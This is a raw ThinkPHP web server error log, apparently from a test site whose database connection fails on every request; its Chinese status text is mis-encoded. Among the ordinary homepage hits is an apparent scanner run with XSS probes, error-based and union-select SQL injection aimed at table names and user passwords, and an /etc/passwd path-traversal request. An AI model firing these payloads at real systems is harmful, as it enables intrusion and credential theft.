---------------------------------------------------------------
[ 2018-09-25T02:25:32+08:00 ] 220.181.159.82 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 3.772906s][Е░·Е░░Г▌┤О╪ 0.27req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.38kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:33:37+08:00 ] 182.118.33.6 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 4.499309s][Е░·Е░░Г▌┤О╪ 0.22req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.93kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:33:50+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.624751s][Е░·Е░░Г▌┤О╪ 0.62req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.93kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:33:53+08:00 ] 218.30.117.73 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.93kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:04+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.156073s][Е░·Е░░Г▌┤О╪ 0.86req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.13kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:10+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.366977s][Е░·Е░░Г▌┤О╪ 0.73req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.13kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:16+08:00 ] 220.181.55.144 GET /index.php?a=1%3Cscript%3Ealert(abc)%3C/script%3E
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?a=1%3Cscript%3Ealert(abc)%3C/script%3E [Х©░Х║▄Ф≈╤И≈╢О╪ 1.124827s][Е░·Е░░Г▌┤О╪ 0.89req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.02kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:18+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.062337s][Е░·Е░░Г▌┤О╪ 0.94req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.93kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:37+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.98kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:39+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.117016s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:39+08:00 ] 220.181.55.144 GET /admin.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/admin.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.132639s][Е░·Е░░Г▌┤О╪ 0.88req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.98kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:41+08:00 ] 220.181.55.144 GET /admin.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/admin.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.109204s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.98kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:43+08:00 ] 220.181.55.144 GET /admin.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/admin.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.148261s][Е░·Е░░Г▌┤О╪ 0.87req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.98kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:34:45+08:00 ] 220.181.55.144 GET /admin.php
[ info ] xszzglzx.w133-e1.ezwebtest.com/admin.php [Х©░Х║▄Ф≈╤И≈╢О╪ 1.132639s][Е░·Е░░Г▌┤О╪ 0.88req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,206.98kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:02+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.234186s][Е░·Е░░Г▌┤О╪ 0.81req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.00kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:03+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.156073s][Е░·Е░░Г▌┤О╪ 0.86req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.00kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:20+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.04kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:26+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.070149s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:32+08:00 ] 220.181.55.144 GET /?%22onmouseover='prompt(42873)'bad=%22%3E
[ info ] xszzglzx.w133-e1.ezwebtest.com/?%22onmouseover='prompt(42873)'bad=%22%3E [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.13kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:35+08:00 ] 220.181.55.144 GET /?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E
[ info ] xszzglzx.w133-e1.ezwebtest.com/?xss_test%3Ciframe%20src=javascript:this[%22%5Cx61%5Cx6c%5Cx65%5Cx72%5Cx74%22](%2242873%22)%3E [Х©░Х║▄Ф≈╤И≈╢О╪ 1.077959s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.06kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:37+08:00 ] 220.181.55.144 GET /?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
[ info ] xszzglzx.w133-e1.ezwebtest.com/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E [Х©░Х║▄Ф≈╤И≈╢О╪ 1.077960s][Е░·Е░░Г▌┤О╪ 0.93req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.13kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:40+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.156072s][Е░·Е░░Г▌┤О╪ 0.86req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.01kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:42+08:00 ] 220.181.55.144 GET /?search=just_test_not_find_href
[ info ] xszzglzx.w133-e1.ezwebtest.com/?search=just_test_not_find_href [Х©░Х║▄Ф≈╤И≈╢О╪ 1.109204s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.17kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:43+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:45+08:00 ] 220.181.55.144 GET /?PHPSESSID=nosecorgtestforphpsessid
[ info ] xszzglzx.w133-e1.ezwebtest.com/?PHPSESSID=nosecorgtestforphpsessid [Х©░Х║▄Ф≈╤И≈╢О╪ 1.109204s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.09kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:47+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.124827s][Е░·Е░░Г▌┤О╪ 0.89req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:51+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.101393s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:53+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:35:58+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.140450s][Е░·Е░░Г▌┤О╪ 0.88req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:00+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.140450s][Е░·Е░░Г▌┤О╪ 0.88req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:01+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.124827s][Е░·Е░░Г▌┤О╪ 0.89req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:03+08:00 ] 220.181.55.144 GET /index.php?ac=search&at=taglist&tagkey=%2527,tags)%20or(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x7e,0x27,table_name,0x27,0x7e))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?ac=search&at=taglist&tagkey=%2527,tags)%20or(select%201%20from(select%20count(*),concat((select%20(select%20concat(0x7e,0x27,table_name,0x27,0x7e))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.085771s][Е░·Е░░Г▌┤О╪ 0.92req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.45kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:04+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.187318s][Е░·Е░░Г▌┤О╪ 0.84req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:06+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.148261s][Е░·Е░░Г▌┤О╪ 0.87req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:08+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.124827s][Е░·Е░░Г▌┤О╪ 0.89req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:15+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.132638s][Е░·Е░░Г▌┤О╪ 0.88req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:19+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.148261s][Е░·Е░░Г▌┤О╪ 0.87req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:21+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.218563s][Е░·Е░░Г▌┤О╪ 0.82req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:23+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.148261s][Е░·Е░░Г▌┤О╪ 0.87req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:25+08:00 ] 220.181.55.144 GET /index.php?case=../../../../../../../../../../../../../../../../etc/passwd%00
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?case=../../../../../../../../../../../../../../../../etc/passwd%00 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.093582s][Е░·Е░░Г▌┤О╪ 0.91req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.23kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:25+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.117016s][Е░·Е░░Г▌┤О╪ 0.90req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:31+08:00 ] 220.181.55.144 GET /index.php?doc-summary-xxxxxxxxx%27%20and%201=2%20union%20select%201,2,3,4,5,CONCAT(0x7c,username,0x7c,password,0x7c,CHAR(119,101,98,115,99,97,110)),7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20wiki_user%20where%20groupid=4%20limit%201%23
[ info ] xszzglzx.w133-e1.ezwebtest.com/index.php?doc-summary-xxxxxxxxx%27%20and%201=2%20union%20select%201,2,3,4,5,CONCAT(0x7c,username,0x7c,password,0x7c,CHAR(119,101,98,115,99,97,110)),7,8,9,10,11,12,13,14,15,16,17,18,19,20%20from%20wiki_user%20where%20groupid=4%20limit%201%23 [Х©░Х║▄Ф≈╤И≈╢О╪ 1.210751s][Е░·Е░░Г▌┤О╪ 0.83req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.38kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
[ error ] [2002]SQLSTATE[HY000] [2002] сисзд©╠Й╪фкЦ╩З╩Щ╪╚╬э╬Ьё╛нч╥╗а╛╫с║ё
[D:\wwwroot\xszzglzx\wwwroot\thinkphp\library\think\db\Connection.php:295]
---------------------------------------------------------------
[ 2018-09-25T08:36:32+08:00 ] 220.181.55.144 GET /
[ info ] xszzglzx.w133-e1.ezwebtest.com/ [Х©░Х║▄Ф≈╤И≈╢О╪ 1.359166s][Е░·Е░░Г▌┤О╪ 0.74req/s] [Е├┘Е╜≤Ф╤┬Х─≈О╪ 2,207.05kb] [Ф√┤Д╩╤Е┼═Х╫╫О╪ 48]
